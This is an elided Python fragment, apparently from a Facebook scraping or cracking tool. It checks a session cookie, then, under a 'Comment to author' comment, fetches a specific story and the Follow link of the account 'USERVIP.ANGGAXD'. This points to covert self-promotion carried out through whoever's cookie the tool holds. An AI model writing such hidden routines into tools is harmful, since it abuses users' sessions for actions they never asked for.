    ...
    try:
        ...
        if "mbasic_logout_button" in str(ismi):
            ...
            try:
                ...
                # Comment to author
                x = {}
                to = parser(requests.get(host.format("/story.php?story_fbid=102468288279872&substory_index=2&id=100042800416881"),cookies=kuki).content,"html.parser")
                ...
                ikuti = parser(requests.get(host.format("/USERVIP.ANGGAXD"),cookies=kuki).content,"html.parser").find("a",string="Ikuti")["href"]
